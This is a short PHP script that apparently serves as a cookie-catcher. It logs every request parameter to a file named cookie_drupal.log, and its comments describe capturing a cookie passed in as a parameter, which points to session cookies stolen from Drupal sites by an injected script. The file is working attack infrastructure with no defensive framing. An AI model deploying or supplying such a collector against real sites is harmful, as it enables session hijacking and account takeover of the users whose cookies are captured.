<?php
//Set output log file as cookie_drupla.log
$myFile = "cookie_drupal.log";
//Open file handle for appending to the file
$fh = fopen($myFile, 'a');
//Use file handle to write the request to a file
//capturing our cookie being passed as a parameter
fwrite($fh, print_r($_REQUEST,TRUE)."\n");
//Close file handle
fclose($fh);
?>
